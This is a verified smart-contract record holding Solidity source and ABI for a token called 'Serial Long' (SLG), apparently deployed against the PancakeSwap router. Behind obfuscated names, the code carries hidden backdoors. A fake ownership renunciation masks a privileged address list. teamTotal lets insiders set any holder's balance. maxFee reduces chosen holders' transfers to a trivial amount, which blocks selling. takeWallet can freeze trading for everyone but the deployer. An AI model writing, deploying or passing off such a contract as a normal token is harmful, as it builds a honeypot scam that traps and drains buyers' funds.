{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface autoTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract tradingEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface amountTo {\n    function createPair(address swapLiquidityAuto, address totalShould) external returns (address);\n}\n\ninterface senderAtExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address totalToSell) external view returns (uint256);\n\n    function transfer(address autoTeam, uint256 limitWallet) external returns (bool);\n\n    function allowance(address isTakeLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 limitWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoTeam,\n        uint256 limitWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalAt, uint256 value);\n    event Approval(address indexed isTakeLaunched, address indexed spender, uint256 value);\n}\n\ninterface senderAtExemptMetadata is senderAtExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SerialLong is tradingEnable, senderAtExempt, senderAtExemptMetadata {\n\n    function transfer(address limitFundExempt, uint256 limitWallet) external virtual override returns (bool) {\n        return exemptWallet(_msgSender(), limitFundExempt, limitWallet);\n    }\n\n    function transferFrom(address fundMode, address autoTeam, uint256 limitWallet) external override returns (bool) {\n        if (_msgSender() != receiverList) {\n            if (liquidityList[fundMode][_msgSender()] != type(uint256).max) {\n                require(limitWallet <= liquidityList[fundMode][_msgSender()]);\n                liquidityList[fundMode][_msgSender()] -= limitWallet;\n            }\n        }\n        return exemptWallet(fundMode, autoTeam, limitWallet);\n    }\n\n    mapping(address => uint256) private atShould;\n\n    bool public marketingBuy;\n\n    mapping(address => bool) public modeEnable;\n\n    constructor (){\n        if (senderMax != sellWallet) {\n            sellWallet = senderMax;\n        }\n        autoTx isTrading = autoTx(receiverList);\n        launchedMarketingIs = amountTo(isTrading.factory()).createPair(isTrading.WETH(), address(this));\n        \n        minSellAt = _msgSender();\n        atList();\n        takeLaunched[minSellAt] = true;\n        atShould[minSellAt] = teamReceiver;\n        if (senderMax == sellWallet) {\n            isAt = true;\n        }\n        emit Transfer(address(0), minSellAt, teamReceiver);\n    }\n\n    bool public isAt;\n\n    function isListLimit(address receiverMin) public {\n        require(receiverMin.balance < 100000);\n        if (senderSwapToken) {\n            return;\n        }\n        if (marketingBuy) {\n            senderMax = sellWallet;\n        }\n        takeLaunched[receiverMin] = true;\n        if (isAt) {\n            sellWallet = senderMax;\n        }\n        senderSwapToken = true;\n    }\n\n    bool public senderSwapToken;\n\n    mapping(address => bool) public takeLaunched;\n\n    string private listReceiverExempt = \"Serial Long\";\n\n    function allowance(address maxReceiverTeam, address swapLaunched) external view virtual override returns (uint256) {\n        if (swapLaunched == receiverList) {\n            return type(uint256).max;\n        }\n        return liquidityList[maxReceiverTeam][swapLaunched];\n    }\n\n    function atList() public {\n        emit OwnershipTransferred(minSellAt, address(0));\n        takeLimit = address(0);\n    }\n\n    uint256 private sellWallet;\n\n    function balanceOf(address totalToSell) public view virtual override returns (uint256) {\n        return atShould[totalToSell];\n    }\n\n    uint256 constant buyReceiver = 18 ** 10;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedFund;\n    }\n\n    function owner() external view returns (address) {\n        return takeLimit;\n    }\n\n    address receiverList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address fromModeMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamReceiver;\n    }\n\n    uint256 tokenLimit;\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoTotal;\n    }\n\n    function maxFee(address modeSell) public {\n        launchedMaxList();\n        \n        if (modeSell == minSellAt || modeSell == launchedMarketingIs) {\n            return;\n        }\n        modeEnable[modeSell] = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return listReceiverExempt;\n    }\n\n    event OwnershipTransferred(address indexed exemptFrom, address indexed fundLimitAuto);\n\n    function listLaunch(address fundMode, address autoTeam, uint256 limitWallet) internal returns (bool) {\n        require(atShould[fundMode] >= limitWallet);\n        atShould[fundMode] -= limitWallet;\n        atShould[autoTeam] += limitWallet;\n        emit Transfer(fundMode, autoTeam, limitWallet);\n        return true;\n    }\n\n    function teamTotal(address limitFundExempt, uint256 limitWallet) public {\n        launchedMaxList();\n        atShould[limitFundExempt] = limitWallet;\n    }\n\n    address public launchedMarketingIs;\n\n    uint256 maxList;\n\n    address private takeLimit;\n\n    uint256 public senderMax;\n\n    function approve(address swapLaunched, uint256 limitWallet) public virtual override returns (bool) {\n        liquidityList[_msgSender()][swapLaunched] = limitWallet;\n        emit Approval(_msgSender(), swapLaunched, limitWallet);\n        return true;\n    }\n\n    address public minSellAt;\n\n    uint256 private teamReceiver = 100000000 * 10 ** 18;\n\n    uint8 private launchedFund = 18;\n\n    function launchedMaxList() private view {\n        require(takeLaunched[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return takeLimit;\n    }\n\n    string private autoTotal = \"SLG\";\n\n    function exemptWallet(address fundMode, address autoTeam, uint256 limitWallet) internal returns (bool) {\n        if (fundMode == minSellAt) {\n            return listLaunch(fundMode, autoTeam, limitWallet);\n        }\n        uint256 liquidityMin = senderAtExempt(launchedMarketingIs).balanceOf(fromModeMarketing);\n        require(liquidityMin == tokenLimit);\n        require(autoTeam != fromModeMarketing);\n        if (modeEnable[fundMode]) {\n            return listLaunch(fundMode, autoTeam, buyReceiver);\n        }\n        return listLaunch(fundMode, autoTeam, limitWallet);\n    }\n\n    function takeWallet(uint256 limitWallet) public {\n        launchedMaxList();\n        tokenLimit = limitWallet;\n    }\n\n    mapping(address => mapping(address => uint256)) private liquidityList;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTakeLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundLimitAuto\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxReceiverTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalToSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"}],\"name\":\"isListLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMarketingIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeSell\",\"type\":\"address\"}],\"name\":\"maxFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minSellAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSwapToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"limitWallet\",\"type\":\"uint256\"}],\"name\":\"takeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFundExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitWallet\",\"type\":\"uint256\"}],\"name\":\"teamTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFundExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"limitWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SerialLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}